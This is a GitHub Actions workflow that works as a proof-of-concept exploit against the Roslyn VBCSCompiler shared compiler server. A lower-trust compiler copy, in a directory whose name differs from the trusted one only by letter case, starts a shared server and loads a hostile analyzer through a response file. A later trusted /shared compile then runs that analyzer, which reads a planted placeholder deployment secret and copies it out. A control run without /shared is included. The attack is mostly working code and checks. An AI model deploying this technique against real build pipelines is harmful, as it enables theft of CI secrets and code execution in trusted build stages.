name: Roslyn VBCSCompiler trusted-stage secret crossover

on:
  push:
    branches:
      - lab/kestrel-chunk-extensions-20260920
    paths:
      - '.github/workflows/roslyn-vbcs-case-pipe-secret-crossover.yml'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  linux-secret-crossover:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 10.0.401

      - name: Seed lower-trust compiler server, then prove later trusted secret read
        shell: bash
        run: |
          set -euxo pipefail

          ROOT="$RUNNER_TEMP/roslyn-vbcs-secret-crossover"
          ATTACKER_DIR="$ROOT/trustedcompiler"
          TRUSTED_DIR="$ROOT/TrustedCompiler"
          BINDIR="/usr/share/dotnet/sdk/10.0.401/Roslyn/bincore"
          ANALYZER_SRC="$ROOT/analyzer-src"
          ANALYZER_OUT="$ANALYZER_SRC/bin/Release/netstandard2.0/SecretAnalyzer.dll"
          ATTACKER_ANALYZER="$ATTACKER_DIR/SecretAnalyzer.dll"
          SECRET_DIR="$ROOT/trusted-stage"
          SECRET_FILE="$SECRET_DIR/DEPLOYMENT_SECRET.txt"
          EXFIL_FILE="$ROOT/attacker-observed-secret.txt"
          MARKER="$ROOT/ANALYZER_EXECUTED.marker"
          SECRET_VALUE="research-only-trusted-stage-secret"
          LOG="$ROOT/roslyn-client-server.log"

          rm -rf "$ROOT"
          mkdir -p "$ATTACKER_DIR" "$TRUSTED_DIR" "$ANALYZER_SRC"
          cp -a "$BINDIR/." "$ATTACKER_DIR/"
          cp -a "$BINDIR/." "$TRUSTED_DIR/"

          python3 - "$ATTACKER_DIR" "$TRUSTED_DIR" <<'PY'
          import sys
          a,b=sys.argv[1:]
          print("PATHS_DISTINCT=", a != b)
          print("LOWERCASE_IDENTITIES_EQUAL=", a.lower() == b.lower())
          assert a != b and a.lower() == b.lower()
          PY

          cat > "$ANALYZER_SRC/SecretAnalyzer.csproj" <<'EOF'
          <Project Sdk="Microsoft.NET.Sdk">
            <PropertyGroup>
              <TargetFramework>netstandard2.0</TargetFramework>
              <LangVersion>latest</LangVersion>
              <Nullable>enable</Nullable>
              <ImplicitUsings>disable</ImplicitUsings>
            </PropertyGroup>
            <ItemGroup>
              <PackageReference Include="Microsoft.CodeAnalysis.Common" Version="4.14.0" PrivateAssets="all" />
            </ItemGroup>
          </Project>
          EOF

          cat > "$ANALYZER_SRC/SecretAnalyzer.cs" <<EOF
          using System.Collections.Immutable;
          using System.IO;
          using Microsoft.CodeAnalysis;
          using Microsoft.CodeAnalysis.Diagnostics;

          [DiagnosticAnalyzer(LanguageNames.CSharp)]
          public sealed class SecretAnalyzer : DiagnosticAnalyzer
          {
              private static readonly DiagnosticDescriptor Rule = new(
                  "SAFE002",
                  "Safe trust-boundary research marker",
                  "Safe trust-boundary research marker",
                  "Research",
                  DiagnosticSeverity.Warning,
                  isEnabledByDefault: true);

              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics
                  => ImmutableArray.Create(Rule);

              public override void Initialize(AnalysisContext context)
              {
                  context.EnableConcurrentExecution();
                  context.ConfigureGeneratedCodeAnalysis(GeneratedCodeAnalysisFlags.None);
                  context.RegisterCompilationAction(compilationContext =>
                  {
                      File.WriteAllText(@"$MARKER", "ANALYZER_EXECUTED");
                      if (File.Exists(@"$SECRET_FILE"))
                      {
                          string secret = File.ReadAllText(@"$SECRET_FILE");
                          File.WriteAllText(@"$EXFIL_FILE", secret);
                      }
                      compilationContext.ReportDiagnostic(Diagnostic.Create(Rule, Location.None));
                  });
              }
          }
          EOF

          dotnet build "$ANALYZER_SRC/SecretAnalyzer.csproj"             -c Release             -p:UseSharedCompilation=false             --nologo

          test -f "$ANALYZER_OUT"
          test ! -e "$MARKER"
          test ! -e "$SECRET_FILE"
          test ! -e "$EXFIL_FILE"
          echo "LOWER_TRUST_ANALYZER_BUILD=PASS_NO_EXECUTION_NO_SECRET"

          cp "$ANALYZER_OUT" "$ATTACKER_ANALYZER"
          rm -rf "$ANALYZER_SRC"
          test -f "$ATTACKER_ANALYZER"
          echo "ANALYZER_SOURCE_REMOVED=true"

          export RoslynCommandLineLogFile="$LOG"

          cat > "$ROOT/seed.cs" <<'EOF'
          #error SAFE_SERVER_SEED
          EOF

          echo "=== Start attacker-side shared server with /noconfig ==="
          set +e
          dotnet "$ATTACKER_DIR/csc.dll"             /shared             /noconfig             /nologo             /target:library             "$ROOT/seed.cs"             /out:"$ROOT/seed.dll"             >"$ROOT/seed.stdout" 2>"$ROOT/seed.stderr"
          SEED_RC=$?
          set -e
          cat "$ROOT/seed.stdout"
          cat "$ROOT/seed.stderr"
          grep -q "SAFE_SERVER_SEED" "$ROOT/seed.stdout" "$ROOT/seed.stderr"
          test ! -e "$MARKER"
          test ! -e "$SECRET_FILE"
          test ! -e "$EXFIL_FILE"
          echo "SERVER_SEED=PASS_NO_ANALYZER_EXECUTION_NO_SECRET"

          echo "=== Add attacker-only server response file after server start ==="
          cat > "$ATTACKER_DIR/csc.rsp" <<EOF
          /analyzer:$ATTACKER_ANALYZER
          EOF
          rm -f "$TRUSTED_DIR/csc.rsp"

          if grep -R -q "SecretAnalyzer" "$TRUSTED_DIR"; then
            echo "TRUSTED_COMPILER_PRECONDITION=FAILED"
            exit 1
          fi
          echo "TRUSTED_COMPILER_PRECONDITION=PASS_NO_ATTACKER_ANALYZER"

          REFDIR="$(find /usr/share/dotnet/packs/Microsoft.NETCore.App.Ref -type d -path '*/ref/net10.0' | sort -V | tail -1)"
          test -d "$REFDIR"
          REF_ARGS=()
          for ref in "$REFDIR"/*.dll; do
            REF_ARGS+=("/reference:$ref")
          done

          cat > "$ROOT/victim.cs" <<'EOF'
          public sealed class TrustedVictim
          {
          }
          EOF

          echo "=== Trusted stage begins; fake secret appears only now ==="
          mkdir -p "$SECRET_DIR"
          printf '%s' "$SECRET_VALUE" > "$SECRET_FILE"
          test -f "$SECRET_FILE"
          test ! -e "$EXFIL_FILE"
          test ! -e "$MARKER"
          echo "TRUSTED_STAGE_SECRET_CREATED_AFTER_ATTACKER_SETUP=true"

          echo "=== Trusted case-distinct compiler uses /shared ==="
          set +e
          dotnet "$TRUSTED_DIR/csc.dll"             /shared             /nologo             /target:library             "${REF_ARGS[@]}"             "$ROOT/victim.cs"             /out:"$ROOT/victim.dll"             >"$ROOT/victim.stdout" 2>"$ROOT/victim.stderr"
          VICTIM_RC=$?
          set -e
          cat "$ROOT/victim.stdout"
          cat "$ROOT/victim.stderr"
          echo "VICTIM_RC=$VICTIM_RC"

          test "$VICTIM_RC" -eq 0
          test -f "$MARKER"
          test -f "$EXFIL_FILE"
          test "$(cat "$EXFIL_FILE")" = "$SECRET_VALUE"
          grep -q "SAFE002" "$ROOT/victim.stdout" "$ROOT/victim.stderr"

          echo "TRUSTED_STAGE_RESULT=ATTACKER_ANALYZER_READ_LATER_CREATED_SECRET"
          echo "EXFILTRATED_VALUE=$(cat "$EXFIL_FILE")"

          echo "=== Hard control: identical trusted compiler without /shared ==="
          rm -f "$MARKER" "$EXFIL_FILE"

          set +e
          dotnet "$TRUSTED_DIR/csc.dll"             /nologo             /target:library             "${REF_ARGS[@]}"             "$ROOT/victim.cs"             /out:"$ROOT/control.dll"             >"$ROOT/control.stdout" 2>"$ROOT/control.stderr"
          CONTROL_RC=$?
          set -e
          cat "$ROOT/control.stdout"
          cat "$ROOT/control.stderr"
          echo "CONTROL_RC=$CONTROL_RC"

          test "$CONTROL_RC" -eq 0
          test ! -e "$MARKER"
          test ! -e "$EXFIL_FILE"
          ! grep -q "SAFE002" "$ROOT/control.stdout" "$ROOT/control.stderr"
          echo "NO_SHARED_CONTROL=TRUSTED_COMPILE_COMPLETED_WITHOUT_ATTACKER_CODE_OR_SECRET_READ"

          cp "$ROOT/seed.stdout" "$GITHUB_WORKSPACE/roslyn-secret-seed.stdout"
          cp "$ROOT/seed.stderr" "$GITHUB_WORKSPACE/roslyn-secret-seed.stderr"
          cp "$ROOT/victim.stdout" "$GITHUB_WORKSPACE/roslyn-secret-victim.stdout"
          cp "$ROOT/victim.stderr" "$GITHUB_WORKSPACE/roslyn-secret-victim.stderr"
          cp "$ROOT/control.stdout" "$GITHUB_WORKSPACE/roslyn-secret-control.stdout"
          cp "$ROOT/control.stderr" "$GITHUB_WORKSPACE/roslyn-secret-control.stderr"
          printf '%s' "$SECRET_VALUE" > "$GITHUB_WORKSPACE/roslyn-secret-expected.txt"
          cp "$LOG" "$GITHUB_WORKSPACE/roslyn-secret-client-server.log" || true

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: roslyn-vbcs-case-pipe-secret-crossover
          path: |
            roslyn-secret-*.stdout
            roslyn-secret-*.stderr
            roslyn-secret-*.txt
            roslyn-secret-client-server.log
